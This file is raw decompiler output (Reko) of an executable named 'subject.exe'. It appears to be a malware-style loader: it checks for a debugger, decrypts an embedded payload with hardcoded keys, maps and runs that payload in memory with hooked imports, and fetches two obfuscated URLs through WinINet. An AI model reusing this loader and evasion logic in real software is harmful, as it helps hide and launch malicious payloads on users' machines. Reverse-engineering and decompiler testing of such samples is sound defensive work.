// subject_data_0000.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

byte g_b3E4000 = 0xA0; // 003E4000
uint32 g_dw3E9A03 = 0x5A00; // 003E9A03
Eq_32 g_t3E9A10 = null; // 003E9A10
Eq_32 g_t3E9A14 = null; // 003E9A14
Eq_33 g_t3E9A18 = null; // 003E9A18
Eq_3 g_t3E9A1C = // 003E9A1C
	{
		null
	};
// subject_data_0002.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

word32 g_dw411056 = 0x00; // 00411056
word32 g_dw41105A = 0x00; // 0041105A
word32 g_dw41105E = 0x00; // 0041105E
word32 g_dw411062 = 0x00; // 00411062
// subject_rdata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

<anonymous> * __imp__VirtualProtect = &g_t3118; // 003E3000
<anonymous> * __imp__GetProcAddress = &g_t312A; // 003E3004
<anonymous> * __imp__LoadLibraryA = &g_t313C; // 003E3008
<anonymous> * __imp__GetModuleHandleA = &g_t314C; // 003E300C
<anonymous> * __imp__ReadFile = &g_t3160; // 003E3010
<anonymous> * __imp__WriteFile = &g_t316C; // 003E3014
<anonymous> * __imp__CloseHandle = &g_t3178; // 003E3018
<anonymous> * __imp__CreateThread = &g_t3186; // 003E301C
<anonymous> * __imp__CreatePipe = &g_t3196; // 003E3020
<anonymous> * __imp__OutputDebugStringA = &g_t31A4; // 003E3024
<anonymous> * __imp__ExitProcess = &g_t31BA; // 003E3028
<anonymous> * __imp__InternetCloseHandle = &g_t31EA; // 003E3030
<anonymous> * __imp__InternetOpenUrlA = &g_t3200; // 003E3034
<anonymous> * __imp__InternetOpenA = &g_t3214; // 003E3038
<anonymous> * __imp__InternetReadFile = &g_t31D6; // 003E303C
byte g_b3E3050 = 0x6B; // 003E3050
byte g_b3E3060 = 0x47; // 003E3060
byte g_b3E3074 = 0x47; // 003E3074
word32 g_dw3E30D4 = 0x3118; // 003E30D4
word32 g_dw3E30D8 = 0x312A; // 003E30D8
word32 g_dw3E30DC = 0x313C; // 003E30DC
word32 g_dw3E30E0 = 12620; // 003E30E0
word32 g_dw3E30E4 = 0x3160; // 003E30E4
word32 g_dw3E30E8 = 12652; // 003E30E8
word32 g_dw3E30EC = 12664; // 003E30EC
word32 g_dw3E30F0 = 0x3186; // 003E30F0
word32 g_dw3E30F4 = 0x3196; // 003E30F4
word32 g_dw3E30F8 = 0x31A4; // 003E30F8
word32 g_dw3E30FC = 0x31BA; // 003E30FC
word32 g_dw3E3104 = 12778; // 003E3104
word32 g_dw3E3108 = 0x3200; // 003E3108
word32 g_dw3E310C = 12820; // 003E310C
word32 g_dw3E3110 = 0x31D6; // 003E3110
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 003E1000: Register word32 fn003E1000(Stack Eq_3 dwArg04)
// Called from:
//      fn003E1440
word32 fn003E1000(Eq_3 dwArg04)
{
	return dwArg04 + Mem22[dwArg04 + 60:word32];
}

// 003E101E: void fn003E101E(Register word32 ecx, Stack (ptr32 byte) dwArg04, Stack Eq_3 dwArg08, Stack Eq_11 dwArg0C)
// Called from:
//      fn003E1440
void fn003E101E(word32 ecx, byte * dwArg04, Eq_3 dwArg08, Eq_11 dwArg0C)
{
	Eq_12 tLoc08;
	tLoc08 = (Eq_12) ecx;
	fn003E1EA7(dwArg08, dwArg04, dwArg0C);
	VirtualProtect(dwArg08, dwArg0C, 0x02, &tLoc08);
}

int32 g_t3E1050() = ??/* Unexpected function type (fn int32 ()) */ ; // 003E1050
int32 g_t3E1082() = ??/* Unexpected function type (fn int32 ()) */ ; // 003E1082
// 003E10B2: Register Eq_32 fn003E10B2(Stack Eq_33 dwArg04, Stack Eq_34 dwArg08, Stack Eq_34 dwArg0C)
// Called from:
//      fn003E1139
Eq_32 fn003E10B2(Eq_33 dwArg04, Eq_34 dwArg08, Eq_34 dwArg0C)
{
	Eq_32 eax_103;
	Eq_32 eax_21 = GetProcAddress(dwArg04, dwArg0C);
	if (fn003E1F8E(dwArg08, &g_b3E3050) == 0x00)
	{
		if (fn003E1F12(dwArg0C, &g_b3E3060) == 0x00)
		{
			g_t3E9A10 = eax_21;
			eax_103 = (Eq_32) &g_t3E1050;
			return eax_103;
		}
		if (fn003E1F12(dwArg0C, &g_b3E3074) == 0x00)
		{
			g_t3E9A14 = eax_21;
			eax_103 = (Eq_32) &g_t3E1082;
			return eax_103;
		}
	}
	eax_103 = eax_21;
	return eax_103;
}

// 003E1125: Register byte fn003E1125(Stack ui32 dwArg04)
// Called from:
//      fn003E1139
byte fn003E1125(ui32 dwArg04)
{
	return (byte) ((dwArg04 & 0x80000000) != 0x00);
}

// 003E1139: void fn003E1139(Stack (ptr32 Eq_77) dwArg04, Stack Eq_3 dwArg08)
// Called from:
//      fn003E1440
void fn003E1139(struct Eq_77 * dwArg04, Eq_3 dwArg08)
{
	g_t3E9A18 = GetModuleHandleA(null);
	g_t3E9A1C.u0 = (struct Eq_785 *) dwArg08;
	struct Eq_88 * dwLoc08_262 = dwArg08.u0 + dwArg04->dw0080;
	while (dwLoc08_262->dw000C != 0x00)
	{
		union Eq_93 * dwLoc10_270;
		Eq_34 ecx_65 = dwArg08.u0 + dwLoc08_262->dw000C;
		Eq_33 eax_70 = LoadLibraryA(ecx_65);
		if (dwLoc08_262->dw0004 == 0x00)
			dwLoc10_270 = (union Eq_93 *) (dwArg08.u0 + dwLoc08_262->dw0010);
		else
			dwLoc10_270 = (union Eq_93 *) (dwArg08.u0 + dwLoc08_262->dw0000);
		word32 * dwLoc18_274 = dwArg08.u0 + dwLoc08_262->dw0010;
		while (dwLoc10_270->u1 != 0x00)
		{
			Eq_32 dwLoc14_282;
			if ((word32) fn003E1125(dwLoc10_270->u1) != 0x00)
				dwLoc14_282 = GetProcAddress(eax_70, (word32) dwLoc10_270->u0);
			else
				dwLoc14_282 = fn003E10B2(eax_70, ecx_65, dwArg08.u0 + dwLoc10_270->u1 + 2);
			*dwLoc18_274 = (word32) dwLoc14_282;
			++dwLoc18_274;
			dwLoc10_270 = (union Eq_93 *) ((char *) dwLoc10_270 + 4);
		}
		++dwLoc08_262;
	}
}

// 003E1270: void fn003E1270(Stack Eq_169 dwArg04, Stack Eq_3 dwArg08, Stack Eq_12 dwArg0C)
// Called from:
//      fn003E12DF
void fn003E1270(Eq_169 dwArg04, Eq_3 dwArg08, Eq_12 dwArg0C)
{
	ptr32 fp;
	do
		;
	while (ReadFile(dwArg04, dwArg08, dwArg0C, fp - 8, null) != 0x00 && dwArg0C != 0x00);
}

// 003E12A7: void fn003E12A7(Stack Eq_169 dwArg04, Stack Eq_189 dwArg08, Stack Eq_12 dwArg0C)
// Called from:
//      fn003E12DF
void fn003E12A7(Eq_169 dwArg04, Eq_189 dwArg08, Eq_12 dwArg0C)
{
	ptr32 fp;
	do
		;
	while (WriteFile(dwArg04, dwArg08, dwArg0C, fp - 8, null) != 0x00 && dwArg0C != 0x00);
}

// 003E12DF: void fn003E12DF(Stack (ptr32 Eq_207) dwArg04, Stack word32 dwArg08, Stack uint32 dwArg0C)
// Called from:
//      fn003E1440
void fn003E12DF(struct Eq_207 * dwArg04, word32 dwArg08, uint32 dwArg0C)
{
	uint32 dwLoc08_82;
	for (dwLoc08_82 = 0x00; dwLoc08_82 < dwArg0C; dwLoc08_82 += 0x02)
	{
		fn003E12A7(dwArg04->t0004, dwArg08 + dwLoc08_82 * 0x04, 0x08);
		fn003E1270(dwArg04->t0000, dwArg08 + dwLoc08_82 * 0x04, 0x08);
	}
}

DWORD g_t3E1333(LPVOID lpThreadParameter) = ??/* Unexpected function type (fn DWORD (LPVOID)) */ ; // 003E1333
// 003E1424: void fn003E1424(Stack (ptr32 Eq_235) dwArg04)
// Called from:
//      fn003E1440
void fn003E1424(struct Eq_235 * dwArg04)
{
	CloseHandle(dwArg04->t0000);
	CloseHandle(dwArg04->t0004);
}

// 003E1440: Register word32 fn003E1440()
// Called from:
//      Win32CrtStartup
word32 fn003E1440()
{
	Eq_251 tLoc24;
	Eq_252 tLoc18;
	Eq_12 tLoc0C;
	struct Eq_254 * eax_18 = fn003E1B30()->ptr0030;
	if ((word32) eax_18->b0002 == 0x00)
	{
		g_dw411056 = 30301;
		g_dw41105A = 5484;
		g_dw41105E = 0x727A;
		g_dw411062 = 8655;
		if (CreatePipe(&tLoc24, (char *) &tLoc18 + 4, null, 0x10) != 0x00 && CreatePipe(&tLoc18, (char *) (&tLoc24) + 4, null, 0x10) != 0x00)
		{
			Eq_169 eax_76 = CreateThread(null, 0x00, &g_t3E1333, &tLoc24, 0x00, &tLoc0C);
			fn003E12DF(&tLoc18, 0x003E4000, g_dw3E9A03 >> 0x02);
			fn003E1424(&tLoc18);
			fn003E1424(&tLoc24);
			CloseHandle(eax_76);
			struct Eq_77 * eax_119 = fn003E1000(0x003E4000);
			if (eax_119 != null)
			{
				Eq_3 v17_135 = eax_119->t0034.u0;
				fn003E101E(0x003E4000, &g_b3E4000, v17_135, eax_119->t0054);
				fn003E1B40(eax_119, 0x003E4000, v17_135);
				struct Eq_77 * eax_178 = fn003E1000(v17_135);
				if (eax_178 != null)
				{
					fn003E1139(eax_178, v17_135);
					fn003E1CD1(eax_178, v17_135);
					eax_18->t0008.u0 = (struct Eq_785 *) v17_135;
					<anonymous> * ecx_238 = v17_135.u0 + eax_119->dw0028;
					ecx_238();
				}
			}
		}
	}
	return 0x00;
}

// 003E15B4: void fn003E15B4(Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
// Called from:
//      fn003E1678
void fn003E15B4(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	struct Eq_396 * fp;
	fp->dwFFFFFFEC = fp->dwFFFFFFEC;
	WININET.dll!InternetReadFile(dwArg04, dwArg08, dwArg0C, fp - 8) == 0x00;
	esp_44->dwFFFFFFFC = 0x00;
}

// 003E15FA: void fn003E15FA(Stack (ptr32 byte) dwArg04)
// Called from:
//      fn003E1678
void fn003E15FA(byte * dwArg04)
{
	while ((word32) *dwArg04 != 0x00)
	{
		*dwArg04 = ~0x00 - *dwArg04;
		++dwArg04;
	}
}

// 003E1678: void fn003E1678()
// Called from:
//      Win32CrtStartup
void fn003E1678()
{
	ptr32 fp;
	word32 eax_281 = fn003E1DDA();
	fn003E15FA(fp - 84);
	fn003E15FA(fp - 0x0080);
	fn003E15FA(fp - 0x9C);
	word32 eax_337 = WININET.dll!InternetOpenA(fp - 0x9C, fp - 84, 0x01, 0x00, 0x00, 0x00);
	if (eax_337 != 0x00)
	{
		int32 dwLocA0_667;
		for (dwLocA0_667 = 0x00; dwLocA0_667 < 0x02; ++dwLocA0_667)
		{
			ptr32 dwLocB0_676;
			if (dwLocA0_667 == 0x00)
				dwLocB0_676 = fp - 0x0080;
			else
				dwLocB0_676 = fp - 0x9C;
			word32 eax_400 = WININET.dll!InternetOpenUrlA(eax_337, dwLocB0_676, 0x00, 0x00, 0x04083000, 0x00);
			if (eax_400 != 0x00)
			{
				esp_398->dwFFFFFFFC = 0x1000;
				esp_398->dwFFFFFFF8 = eax_281;
				esp_398->dwFFFFFFF4 = eax_400;
				fn003E15B4(esp_398->dwFFFFFFF4, esp_398->dwFFFFFFF8, esp_398->dwFFFFFFFC);
				WININET.dll!InternetCloseHandle(eax_400);
			}
		}
		WININET.dll!InternetCloseHandle(eax_337);
	}
	struct Eq_463 * esp_335;
	esp_335->dwFFFFFFFC = eax_281;
	fn003E1DE1();
}

// 003E1B12: Register Eq_12 Win32CrtStartup()
Eq_12 Win32CrtStartup()
{
	fn003E1678();
	ExitProcess(fn003E1440());
}

// 003E1B30: Register word32 fn003E1B30()
// Called from:
//      fn003E1440
word32 fn003E1B30()
{
	struct Eq_534 * fs;
	return fs->dw0018;
}

// 003E1B40: void fn003E1B40(Stack (ptr32 Eq_77) dwArg04, Stack word32 dwArg08, Stack Eq_3 dwArg0C)
// Called from:
//      fn003E1440
void fn003E1B40(struct Eq_77 * dwArg04, word32 dwArg08, Eq_3 dwArg0C)
{
	word16 ax_17 = dwArg04->w0006;
	word16 wLoc14_120;
	for (wLoc14_120 = 0x00; (word32) wLoc14_120 < (word32) ax_17; ++wLoc14_120)
	{
		Eq_11 dwLoc2C_128;
		Eq_11 eax_42 = (&dwArg04->dw0080 + 30)[((word32) wLoc14_120 *s 0x28 + 8) / 0x0084];
		Eq_11 eax_52 = (&dwArg04->dw0080 + 30)[((word32) wLoc14_120 *s 0x28 + 16) / 0x0084];
		if (eax_42 < eax_52)
			dwLoc2C_128 = eax_42;
		else
			dwLoc2C_128 = eax_52;
		fn003E1EA7(dwArg0C + Mem74[(CONVERT(wLoc14_120, word16, word32) *s 0x28 + 0x0C) + (dwArg04 + 0xF8):word32], dwArg08 + Mem85[(CONVERT(wLoc14_120, word16, word32) *s 0x28 + 20) + (dwArg04 + 0xF8):word32], dwLoc2C_128);
	}
}

// 003E1C09: Register ui32 fn003E1C09(Stack ui32 dwArg04)
// Called from:
//      fn003E1CD1
ui32 fn003E1C09(ui32 dwArg04)
{
	ui32 dwLoc08_165 = 0x00;
	if ((dwArg04 & 0x04000000) != 0x00)
		dwLoc08_165 = 0x0200;
	ui32 dwLoc08_172;
	if ((dwArg04 & 0x20000000) != 0x00)
	{
		if ((dwArg04 & 0x40000000) != 0x00)
		{
			if ((dwArg04 & 0x80000000) != 0x00)
				dwLoc08_172 = dwLoc08_165 | 0x40;
			else
				dwLoc08_172 = dwLoc08_165 | 0x20;
		}
		else if ((dwArg04 & 0x80000000) != 0x00)
			dwLoc08_172 = dwLoc08_165 | 0x80;
		else
			dwLoc08_172 = dwLoc08_165 | 0x10;
	}
	else if ((dwArg04 & 0x40000000) != 0x00)
	{
		if ((dwArg04 & 0x80000000) != 0x00)
			dwLoc08_172 = dwLoc08_165 | 0x04;
		else
			dwLoc08_172 = dwLoc08_165 | 0x02;
	}
	else if ((dwArg04 & 0x80000000) != 0x00)
		dwLoc08_172 = dwLoc08_165 | 0x08;
	else
		dwLoc08_172 = dwLoc08_165 | 0x01;
	return dwLoc08_172;
}

// 003E1CD1: void fn003E1CD1(Stack (ptr32 Eq_77) dwArg04, Stack Eq_3 dwArg08)
// Called from:
//      fn003E1440
void fn003E1CD1(struct Eq_77 * dwArg04, Eq_3 dwArg08)
{
	Eq_12 tLoc18;
	word16 ax_17 = dwArg04->w0006;
	word16 wLoc14_108;
	for (wLoc14_108 = 0x00; (word32) wLoc14_108 < (word32) ax_17; ++wLoc14_108)
		VirtualProtect(dwArg08 + Mem27[(CONVERT(wLoc14_108, word16, word32) *s 0x28 + 0x0C) + (dwArg04 + 0xF8):word32], Mem46[CONVERT(wLoc14_108, word16, word32) *s 0x28 + 8 + (dwArg04 + 0xF8):word32], fn003E1C09(Mem57[CONVERT(wLoc14_108, word16, word32) *s 0x28 + 36 + (dwArg04 + 0xF8):word32]), &tLoc18);
}

// 003E1D70: Register int32 fn003E1D70(Stack int32 dwArg04)
// Called from:
//      fn003E1F8E
int32 fn003E1D70(int32 dwArg04)
{
	int32 eax_14;
	if (dwArg04 >= 0x41 && dwArg04 <= 0x5A)
		eax_14 = dwArg04 + 0x20;
	else
		eax_14 = dwArg04;
	return eax_14;
}

// 003E1DDA: Register word32 fn003E1DDA()
// Called from:
//      fn003E1678
word32 fn003E1DDA()
{
	return 0x00;
}

// 003E1DE1: void fn003E1DE1()
// Called from:
//      fn003E1678
void fn003E1DE1()
{
}

// 003E1EA7: void fn003E1EA7(Stack Eq_3 dwArg04, Stack (ptr32 byte) dwArg08, Stack Eq_11 dwArg0C)
// Called from:
//      fn003E101E
//      fn003E1B40
void fn003E1EA7(Eq_3 dwArg04, byte * dwArg08, Eq_11 dwArg0C)
{
	while (true)
	{
		--dwArg0C;
		if (dwArg0C == 0x00)
			break;
		dwArg04.u0->b0000 = *dwArg08;
		&dwArg04.u0->b0000 = (word32) dwArg04 + 1;
		++dwArg08;
	}
}

// 003E1F12: Register Eq_718 fn003E1F12(Stack Eq_34 dwArg04, Stack (ptr32 byte) dwArg08)
// Called from:
//      fn003E10B2
Eq_718 fn003E1F12(Eq_34 dwArg04, byte * dwArg08)
{
	while (true)
	{
		Eq_718 eax_26 = *dwArg04 - *dwArg08;
		Eq_718 dwLoc08_93 = eax_26;
		if (eax_26 != 0x00 || (int32) (*dwArg08) == 0x00)
			break;
		dwArg04 = (Eq_34) (dwArg04 + 1);
		++dwArg08;
	}
	if (eax_26 < 0x00)
		dwLoc08_93.u0 = ~0x00;
	else if (eax_26 > 0x00)
		dwLoc08_93.u0 = 0x01;
	return dwLoc08_93;
}

// 003E1F8E: Register word32 fn003E1F8E(Stack Eq_34 dwArg04, Stack (ptr32 byte) dwArg08)
// Called from:
//      fn003E10B2
word32 fn003E1F8E(Eq_34 dwArg04, byte * dwArg08)
{
	do
	{
		word32 eax_23 = fn003E1D70((word32) *dwArg04);
		dwArg04 = (Eq_34) (dwArg04 + 1);
		word32 eax_41 = fn003E1D70((word32) *dwArg08);
		++dwArg08;
	} while (eax_23 != 0x00 && eax_23 == eax_41);
	return eax_23 - eax_41;
}

